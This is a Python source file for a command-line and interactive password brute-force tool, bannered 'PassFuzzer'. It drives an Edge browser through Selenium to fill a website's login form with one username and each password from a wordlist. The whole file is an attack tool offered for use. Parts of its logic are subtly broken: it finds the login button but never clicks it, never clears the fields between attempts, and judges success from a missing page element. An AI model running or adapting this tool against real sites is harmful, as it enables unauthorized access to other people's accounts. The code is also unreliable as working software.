import sys
import datetime
import requests
from selenium import webdriver
from optparse import OptionParser
from selenium.webdriver.common.by import By
from selenium.webdriver.edge.service import Service
from selenium.common.exceptions import NoSuchElementException

# Graphics
class color:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    WHITE = '\33[37m'


# Config#
parser = OptionParser()
now = datetime.datetime.now()


# Args
parser.add_option('-l', '--username', dest='username',
                  help='Choose the username')
parser.add_option('-u', '--usernamesel', dest='usernamesel',
                  help='Choose the username selector')
parser.add_option('-p', '--passsel', dest='passsel',
                  help='Choose the password selector')
parser.add_option('-b', '--loginsel', dest='loginsel',
                  help='Choose the login button selector')
parser.add_option('-P', '--passlist', dest='passlist',
                  help='Enter the password list directory')
parser.add_option('-w', '--website', dest='website', help='choose a website')
(c_options, args) = parser.parse_args()

BROWSER_DVR_DIR = 'C:\\webdrivers\\BROWSERdriver.exe'


def wizard():
    print(banner)
    website = input(
        f'{color.GREEN + color.BOLD}\n[~] {color.WHITE}Enter a website: ')
    sys.stdout.write(f'{color.YELLOW}[?] {color.WHITE}Checking if site exists ')
    sys.stdout.flush()
    try:
        request = requests.get(website)
        if request.status_code == 200:
            print(f'{color.GREEN}[OK] {color.WHITE}')
            sys.stdout.flush()
    except NoSuchElementException:
        pass
    except requests.exceptions.MissingSchema:
        print(f'{color.RED}[X] \n[!] {color.WHITE}Invalid URL. Make sure you use http/https only.')
        exit(1)
    except requests.ConnectTimeout:
        print(color.RED + '[X]' + color.YELLOW +
              '\n[!] '+color.WHITE + 'Connection timed out')
        exit(1)
    except KeyboardInterrupt:
        print(color.RED + '[!] ' + color.WHITE + 'Exited upon user request...')
        exit()
    except:
        print(color.RED + '[X]' + color.WHITE)
        print(color.RED + '[!]' + color.WHITE +
              ' Website could not be located make sure to use http / https')
        exit()

    userStr = input(
        color.GREEN + '[~] ' + color.WHITE + 'Enter the username selector: ')
    passStr = input(
        color.GREEN + '[~] ' + color.WHITE + 'Enter the password selector: ')
    lBtnStr = input(
        color.GREEN + '[~] ' + color.WHITE + 'Enter the Login button selector: ')
    user = input(
        color.GREEN + '[~] ' + color.WHITE + 'Enter the username to brute-force: ')
    passList = input(
        color.GREEN + '[~] ' + color.WHITE + 'Enter a directory to a password list: ')
    brutes(user, userStr, passStr, lBtnStr, passList, website)


def brutes(uName, unameStr, passStr, lBtnStr, passList, website):
    options = webdriver.EdgeOptions()
    options.add_experimental_option('excludeSwitches', ['enable-logging'])
    passFile = open(passList, 'r')
    try:
        global driver
        driver = Service(BROWSER_DVR_DIR)
    except:
        print(
            f'{color.RED}\n[?] {color.WHITE}Webdriver binary couldn\'t be found.')
    browser = webdriver.Edge(service=driver)
    temp = ''
    browser.get(website)
    while True:
        try:
            for passTryOption in passFile:
                try:
                    UserSltr = browser.find_element(By.NAME, unameStr)
                    PassSltr = browser.find_element(By.NAME, passStr)
                    btn = browser.find_element(By.NAME, lBtnStr)
                    UserSltr.send_keys(uName)
                    PassSltr.send_keys(passTryOption)
                    temp = passTryOption
                    print(f'{color.CYAN}Tried: {color.WHITE + temp}')
                except KeyboardInterrupt:
                    print(f'{color.RED}[#] {color.WHITE}Exited upon user request...')
                    exit()
                except NoSuchElementException:
                    print(
                        f'{color.CYAN}Password has been found: {color.WHITE + temp}')
                    exit()
        except KeyboardInterrupt:
            print(f'{color.RED}[#] {color.WHITE}Exited upon user request...')
            exit()


banner = color.BOLD + color.YELLOW + '''
 ######                           #######                                         
 #     #    ##     ####    ####   #        #    #  ######  ######  ######  #####  
 #     #   #  #   #       #       #        #    #      #       #   #       #    # 
 ######   #    #   ####    ####   #####    #    #     #       #    #####   #    # 
 #        ######       #       #  #        #    #    #       #     #       #####  
 #        #    #  #    #  #    #  #        #    #   #       #      #       #   #  
 #        #    #   ####    ####   #         ####   ######  ######  ######  #    # 

{0} Password Brute-force tool
{0} Version 1.0
{0} Author: Sparky99
'''.format(color.CYAN)

if c_options.username == None:
    if c_options.usernamesel == None:
        if c_options.passsel == None:
            if c_options.loginsel == None:
                if c_options.passlist == None:
                    if c_options.website == None:
                        try:
                            wizard()
                        except KeyboardInterrupt:
                            print(f'{color.RED}\n[#] {color.WHITE}Exited upon user request...')
                            exit()


user = c_options.username
userStr = c_options.usernamesel
passStr = c_options.passsel
lBtnStr = c_options.loginsel
website = c_options.website
passList = c_options.passlist
print(banner)
brutes(user, userStr, passStr, lBtnStr, passList, website)
